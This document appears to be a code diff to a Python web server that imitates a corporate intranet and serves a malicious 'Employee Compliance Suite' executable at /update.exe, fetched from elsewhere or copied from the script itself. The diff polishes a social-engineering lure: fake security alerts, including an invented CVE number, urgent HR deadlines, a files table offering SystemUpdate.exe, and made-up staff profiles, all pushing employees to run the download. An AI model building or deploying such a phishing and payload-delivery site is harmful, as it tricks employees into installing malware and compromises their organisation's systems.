@@ -54,34 +54,67 @@ class HTTPHandler(BaseHTTPRequestHandler):
         global PAYLOAD_PATH
         # Common nav bar for all pages
         nav_bar = """
-        <nav class="bg-blue-600 text-white py-4">
-            <div class="container mx-auto px-4 flex justify-between items-center">
-                <h1 class="text-xl font-bold">Corporate Intranet</h1>
-                <div class="space-x-4">
-                    <a href="/" class="hover:text-gray-200 {}">Home</a>
-                    <a href="/alerts" class="hover:text-gray-200 {}">Security Alerts</a>
-                    <a href="/training" class="hover:text-gray-200 {}">Training</a>
-                    <a href="/files" class="hover:text-gray-200 {}">Files</a>
-                    <a href="/support" class="hover:text-gray-200 {}">Support</a>
-                    <a href="/about" class="hover:text-gray-200 {}">About</a>
+        <nav class="bg-white shadow-lg sticky top-0 z-50">
+            <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+                <div class="flex items-center">
+                    <img src="https://via.placeholder.com/40" alt="Logo" class="h-10 mr-3">
+                    <h1 class="text-2xl font-bold text-gray-800">Corporate Intranet</h1>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="/" class="text-gray-600 hover:text-blue-600 font-medium {}">Home</a>
+                    <a href="/alerts" class="text-gray-600 hover:text-blue-600 font-medium {}">Security Alerts</a>
+                    <a href="/training" class="text-gray-600 hover:text-blue-600 font-medium {}">Training</a>
+                    <a href="/files" class="text-gray-600 hover:text-blue-600 font-medium {}">Files</a>
+                    <a href="/support" class="text-gray-600 hover:text-blue-600 font-medium {}">Support</a>
+                    <a href="/about" class="text-gray-600 hover:text-blue-600 font-medium {}">About</a>
                 </div>
             </div>
         </nav>
         """.format(
-            "font-semibold" if self.path == "/" else "",
-            "font-semibold" if self.path == "/alerts" else "",
-            "font-semibold" if self.path == "/training" else "",
-            "font-semibold" if self.path == "/files" else "",
-            "font-semibold" if self.path == "/support" else "",
-            "font-semibold" if self.path == "/about" else ""
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/" else "",
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/alerts" else "",
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/training" else "",
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/files" else "",
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/support" else "",
+            "text-blue-600 border-b-2 border-blue-600" if self.path == "/about" else ""
         )
+
+        # Common footer for all pages
+        footer = """
+        <footer class="bg-gray-800 text-white py-8">
+            <div class="container mx-auto px-6">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                    <div>
+                        <h3 class="text-lg font-semibold mb-4">Corporate Intranet</h3>
+                        <p class="text-gray-400">Empowering employees with secure, compliant access to corporate resources since 2020.</p>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-semibold mb-4">Quick Links</h3>
+                        <ul class="space-y-2">
+                            <li><a href="/training" class="text-gray-400 hover:text-white">Training Modules</a></li>
+                            <li><a href="/files" class="text-gray-400 hover:text-white">Files & Resources</a></li>
+                            <li><a href="/support" class="text-gray-400 hover:text-white">IT Support</a></li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-semibold mb-4">Contact Us</h3>
+                        <p class="text-gray-400">Email: support@corporateintranet.com</p>
+                        <p class="text-gray-400">Phone: (555) 012-3456</p>
+                    </div>
+                </div>
+                <div class="mt-8 text-center text-gray-400">
+                    <p>© 2025 Corporate Intranet. All rights reserved.</p>
+                </div>
+            </div>
+        </footer>
+        """
 
         if self.path == '/update.exe':
             self.send_response(200)
             self.send_header('Content-type', 'application/octet-stream')
             self.end_headers()
-            if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
-            else: payload_path = download_payload()
+            # Serve PAYLOAD_PATH or download init.exe
+            payload_path = PAYLOAD_PATH if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH) else download_payload()
             if not payload_path or not os.path.exists(payload_path):
                 payload_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
             with open(payload_path, 'rb') as f:
@@ -100,21 +133,40 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
                     <!-- Hero Section -->
-                    <section class="py-12 text-center">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">2025 Employee Compliance Suite</h2>
-                            <p class="text-lg text-gray-600 mb-6">Install the mandatory Employee Compliance Suite by July 15, 2025, to generate your Network Access Token and comply with HR cybersecurity policies.</p>
-                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
-                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 90%"></div>
+                    <section class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-20">
+                        <div class="container mx-auto px-6 text-center">
+                            <h2 class="text-4xl md:text-5xl font-bold mb-6">2025 Employee Compliance Suite</h2>
+                            <p class="text-lg md:text-xl mb-8 max-w-2xl mx-auto">Install the mandatory Compliance Suite by July 15, 2025, to generate your Network Access Token and stay compliant with HR cybersecurity policies.</p>
+                            <div class="w-3/4 md:w-1/2 mx-auto bg-gray-200 rounded-full h-3 mb-8">
+                                <div class="bg-white h-3 rounded-full" style="width: 90%"></div>
                             </div>
-                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Compliance Suite</a>
+                            <a href="/update.exe" class="inline-block bg-white text-blue-600 font-semibold py-3 px-8 rounded-full hover:bg-gray-200 transition">Download Compliance Suite</a>
                         </div>
                     </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
+                    <!-- News Section -->
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h3 class="text-2xl font-semibold text-gray-800 mb-8 text-center">Latest News & Updates</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">New Security Patch Released</h4>
+                                    <p class="text-gray-600">Ensure your system is protected with the latest patch addressing CVE-2024-30051.</p>
+                                    <a href="/alerts" class="text-blue-600 hover:underline mt-4 inline-block">Read More</a>
+                                </div>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">Mandatory Training Deadline</h4>
+                                    <p class="text-gray-600">Complete your 2025 Phishing Awareness training by July 15, 2025.</p>
+                                    <a href="/training" class="text-blue-600 hover:underline mt-4 inline-block">Start Training</a>
+                                </div>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h4 class="text-xl font-semibold text-gray-800 mb-2">Access Resources</h4>
+                                    <p class="text-gray-600">Download essential tools and documents from our Files section.</p>
+                                    <a href="/files" class="text-blue-600 hover:underline mt-4 inline-block">Browse Files</a>
+                                </div>
+                            </div>
                         </div>
-                    </footer>
+                    </section>
+                    {footer}
                 </body>
             </html>
             """
@@ -132,19 +184,25 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 </head>
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
-                    <section class="py-12">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Security Alerts</h2>
-                            <h3 class="text-xl font-semibold text-gray-700 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
-                            <p class="text-lg text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file. Microsoft released a patch in May 2024.</p>
-                            <p class="text-lg text-gray-600 mb-4">Unpatched systems are vulnerable to malware infections, data breaches, and unauthorized access. Ensure your system is compliant with the latest HR cybersecurity policies.</p>
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Security Alerts</h2>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
+                                    <p class="text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file. Microsoft released a patch in May 2024.</p>
+                                    <p class="text-gray-600 mb-4">Unpatched systems are vulnerable to malware infections, data breaches, and unauthorized access. Install the Compliance Suite to ensure protection.</p>
+                                    <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Download Compliance Suite</a>
+                                </div>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">CVE-2024-12345: Phishing Attack Surge</h3>
+                                    <p class="text-gray-600 mb-4">Recent phishing campaigns target corporate credentials. Our 2025 Compliance Suite includes anti-phishing tools to secure your account.</p>
+                                    <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Download Now</a>
+                                </div>
+                            </div>
                         </div>
                     </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
-                        </div>
-                    </footer>
+                    {footer}
                 </body>
             </html>
             """
@@ -162,19 +220,81 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 </head>
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
-                    <section class="py-12">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Cybersecurity Training Resources</h2>
-                            <p class="text-lg text-gray-600 mb-4">Our 2025 Phishing Awareness and GDPR Compliance training modules are mandatory for all employees. Complete by July 15, 2025, to meet HR requirements.</p>
-                            <p class="text-lg text-gray-600 mb-4">The Employee Compliance Suite includes access to these modules and generates your Network Access Token.</p>
-                            <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Access Training Modules</a>
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Cybersecurity Training Resources</h2>
+                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Complete your mandatory 2025 Phishing Awareness and GDPR Compliance training by July 15, 2025, to meet HR requirements.</p>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">Phishing Awareness Training</h3>
+                                    <p class="text-gray-600 mb-4">Learn to identify and avoid phishing attacks with our interactive module.</p>
+                                    <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Start Training</a>
+                                </div>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2">GDPR Compliance Module</h3>
+                                    <p class="text-gray-600 mb-4">Understand data protection regulations and best practices for compliance.</p>
+                                    <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition">Start Training</a>
+                                </div>
+                            </div>
+                            <div class="text-center mt-8">
+                                <p class="text-gray-600 mb-4">The Employee Compliance Suite includes access to these modules and generates your Network Access Token.</p>
+                                <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-8 rounded-full hover:bg-blue-700 transition">Download Compliance Suite</a>
+                            </div>
                         </div>
                     </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
+                    {footer}
+                </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/files':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = f"""
+            <html>
+                <head>
+                    <title>Files & Resources - Corporate Intranet</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                </head>
+                <body class="bg-gray-100 font-sans">
+                    {nav_bar}
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">Files & Resources</h2>
+                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Access essential tools and documents to stay compliant with 2025 HR policies.</p>
+                            <div class="bg-gray-50 p-6 rounded-lg shadow-md">
+                                <table class="w-full text-left">
+                                    <thead>
+                                        <tr class="border-b">
+                                            <th class="py-3 px-4 text-gray-800 font-semibold">File Name</th>
+                                            <th class="py-3 px-4 text-gray-800 font-semibold">Description</th>
+                                            <th class="py-3 px-4 text-gray-800 font-semibold">Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr class="border-b hover:bg-gray-100">
+                                            <td class="py-3 px-4 text-gray-600">SystemUpdate.exe</td>
+                                            <td class="py-3 px-4 text-gray-600">Employee Compliance Suite for network access and security compliance</td>
+                                            <td class="py-3 px-4"><a href="/update.exe" class="text-blue-600 hover:underline">Download</a></td>
+                                        </tr>
+                                        <tr class="border-b hover:bg-gray-100">
+                                            <td class="py-3 px-4 text-gray-600">SecurityGuide2025.pdf</td>
+                                            <td class="py-3 px-4 text-gray-600">2025 Cybersecurity Best Practices Guide</td>
+                                            <td class="py-3 px-4"><a href="#" class="text-blue-600 hover:underline">Download</a></td>
+                                        </tr>
+                                        <tr class="hover:bg-gray-100">
+                                            <td class="py-3 px-4 text-gray-600">TrainingManual.pdf</td>
+                                            <td class="py-3 px-4 text-gray-600">Phishing Awareness and GDPR Training Manual</td>
+                                            <td class="py-3 px-4"><a href="#" class="text-blue-600 hover:underline">Download</a></td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
                         </div>
-                    </footer>
+                    </section>
+                    {footer}
                 </body>
             </html>
             """
@@ -192,46 +312,25 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 </head>
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
-                    <section class="py-12">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">IT Support</h2>
-                            <p class="text-lg text-gray-600 mb-4">Contact our IT team at support@corporateintranet.com or call (555) 012-3456 for assistance with 2025 compliance policies.</p>
-                            <p class="text-lg text-gray-600 mb-4">Our team ensures all systems meet HR cybersecurity requirements, including the mandatory Employee Compliance Suite installation.</p>
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">IT Support</h2>
+                            <div class="max-w-lg mx-auto">
+                                <p class="text-lg text-gray-600 mb-6">Contact our IT team for assistance with 2025 compliance policies or technical issues.</p>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-4">Submit a Support Request</h3>
+                                    <div class="space-y-4">
+                                        <input type="text" placeholder="Your Name" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600">
+                                        <input type="email" placeholder="Your Email" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600">
+                                        <textarea placeholder="Describe your issue" class="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600" rows="4"></textarea>
+                                        <button class="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition">Submit</button>
+                                    </div>
+                                    <p class="text-gray-600 mt-4">Or contact us directly at <a href="mailto:support@corporateintranet.com" class="text-blue-600 hover:underline">support@corporateintranet.com</a> or (555) 012-3456.</p>
+                                </div>
+                            </div>
                         </div>
                     </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
-                        </div>
-                    </footer>
-                </body>
-            </html>
-            """
-            self.wfile.write(html.encode('utf-8'))
-        elif self.path == '/files':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            html = f"""
-            <html>
-                <head>
-                    <title>File Share - Corporate Intranet</title>
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-                </head>
-                <body class="bg-gray-100 font-sans">
-                    {nav_bar}
-                    <section class="py-12 text-center">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Corporate File Share</h2>
-                            <p class="text-lg text-gray-600 mb-4">Access shared resources after installing the Employee Compliance Suite.</p>
-                        </div>
-                    </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
-                        </div>
-                    </footer>
+                    {footer}
                 </body>
             </html>
             """
@@ -249,18 +348,25 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 </head>
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
-                    <section class="py-12">
-                        <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">About Our IT Team</h2>
-                            <p class="text-lg text-gray-600 mb-4">Led by John Smith (Cybersecurity Lead) and Jane Doe (Compliance Officer), our IT team has over 20 years of experience ensuring network security.</p>
-                            <p class="text-lg text-gray-600 mb-4">We collaborate with HR to enforce 2025 cybersecurity policies, protecting our corporate network from emerging threats.</p>
+                    <section class="py-12 bg-white">
+                        <div class="container mx-auto px-6">
+                            <h2 class="text-3xl font-bold text-gray-800 mb-8 text-center">About Our IT Team</h2>
+                            <p class="text-lg text-gray-600 mb-8 text-center max-w-2xl mx-auto">Our dedicated IT team ensures a secure and compliant corporate network, collaborating with HR to enforce 2025 cybersecurity policies.</p>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <img src="https://via.placeholder.com/150" alt="John Smith" class="w-24 h-24 rounded-full mx-auto mb-4">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2 text-center">John Smith</h3>
+                                    <p class="text-gray-600 text-center">Cybersecurity Lead with over 15 years of experience in network security.</p>
+                                </div>
+                                <div class="bg-gray-50 p-6 rounded-lg shadow-md hover:shadow-lg transition">
+                                    <img src="https://via.placeholder.com/150" alt="Jane Doe" class="w-24 h-24 rounded-full mx-auto mb-4">
+                                    <h3 class="text-xl font-semibold text-gray-800 mb-2 text-center">Jane Doe</h3>
+                                    <p class="text-gray-600 text-center">Compliance Officer specializing in GDPR and corporate policy enforcement.</p>
+                                </div>
+                            </div>
                         </div>
                     </section>
-                    <footer class="bg-gray-800 text-white py-4">
-                        <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
-                        </div>
-                    </footer>
+                    {footer}
                 </body>
             </html>
             """
